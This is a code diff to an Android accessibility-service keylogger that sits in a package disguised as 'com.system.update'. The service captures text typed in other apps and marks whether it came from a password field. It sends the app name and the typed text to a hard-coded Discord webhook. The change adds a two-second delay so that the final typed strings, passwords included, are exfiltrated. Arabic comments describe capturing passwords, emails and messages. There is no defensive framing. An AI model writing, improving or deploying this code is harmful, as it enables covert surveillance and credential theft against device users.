@@ -1,6 +1,8 @@
 package com.system.update;
 
 import android.accessibilityservice.AccessibilityService;
+import android.os.Handler;
+import android.os.Looper;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import org.json.JSONObject;
@@ -10,7 +12,11 @@ import okhttp3.*;
 public class KeyloggerService extends AccessibilityService {
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
     private final OkHttpClient client = new OkHttpClient();
+    
     private String lastText = "";
+    private String lastPkg = "";
+    private Handler handler = new Handler(Looper.getMainLooper());
+    private Runnable sendRunnable;
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -21,17 +27,23 @@ public class KeyloggerService extends AccessibilityService {
                 String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
 
                 if (text.trim().isEmpty() || text.equals(lastText)) return;
+                
                 lastText = text;
+                lastPkg = pkg;
+
                 if (pkg.equals("com.system.update")) return;
 
-                // لو دي خانة باسورد
-                if (source.isPassword()) {
-                    // بنبعت إشارة إنه بيكتب باسورد في التطبيق ده
-                    sendToDiscord("🔐 **محاولة كتابة باسورد!**\n**التطبيق:** `" + pkg + "`\n**النص (لو مسموح):** `" + text + "`");
-                } else {
-                    // كتابة عادية (إيميلات، رسايل، بحث)
-                    sendToDiscord("⌨️ **Keylog:**\n**التطبيق:** `" + pkg + "`\n**النص:** `" + text + "`");
+                // إلغاء الإرسال السابق لو لسه بيكتب
+                if (sendRunnable != null) {
+                    handler.removeCallbacks(sendRunnable);
                 }
+
+                // استنى ثانيتين.. لو مكتوبش تاني، ابعت النتيجة النهائية
+                sendRunnable = () -> {
+                    String type = source.isPassword() ? "🔐 **محاولة باسورد:**" : "⌨️ **نص نهائي:**";
+                    sendToDiscord(type + "\n**التطبيق:** `" + lastPkg + "`\n**النص:** `" + lastText + "`");
+                };
+                handler.postDelayed(sendRunnable, 2000);
             }
         }
     }
